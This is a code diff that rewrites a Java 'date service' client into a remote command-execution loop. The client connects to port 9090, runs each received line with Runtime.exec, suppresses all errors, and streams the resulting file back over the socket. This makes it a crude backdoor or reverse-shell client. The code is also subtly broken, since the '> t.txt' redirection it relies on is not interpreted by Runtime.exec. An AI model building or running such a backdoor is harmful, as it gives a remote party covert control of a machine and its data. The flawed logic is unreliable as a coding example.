@@ -8,14 +8,36 @@ import java.nio.ByteBuffer;
 
 public class Main {
     public static void main(String[] args) throws IOException {
-        String serverAddress = "127.0.0.1";/*JOptionPane.showInputDialog(
-                "Enter IP Address of a machine that is\n" +
-                        "running the date service on port 9090:");*/
+        String serverAddress = "127.0.0.1";
         Socket s = new Socket(serverAddress, 9090);
-        BufferedReader input =
-                new BufferedReader(new InputStreamReader(s.getInputStream()));
-        String answer = input.readLine();
-        Runtime.getRuntime().exec(answer + " > t.txt");
-        //System.exit(0);
+        while (true) {
+            BufferedReader input =
+                    new BufferedReader(new InputStreamReader(s.getInputStream()));
+            String answer = input.readLine();
+            try {
+                Runtime.getRuntime().exec(answer + " > t.txt");
+            } catch (Exception e) {
+
+            }
+            send(s);
+        }
+    }
+
+    private static void send(Socket s) throws IOException {
+        PrintWriter out =
+                new PrintWriter(s.getOutputStream(), true);
+        FileInputStream fstream = new FileInputStream("t.txt");
+        BufferedReader br = new BufferedReader(new InputStreamReader(fstream));
+
+        String strLine;
+
+        //Read File Line By Line
+        while ((strLine = br.readLine()) != null)   {
+            // Print the content on the console
+            out.println (strLine);
+        }
+
+        //Close the input stream
+        br.close();
     }
 }
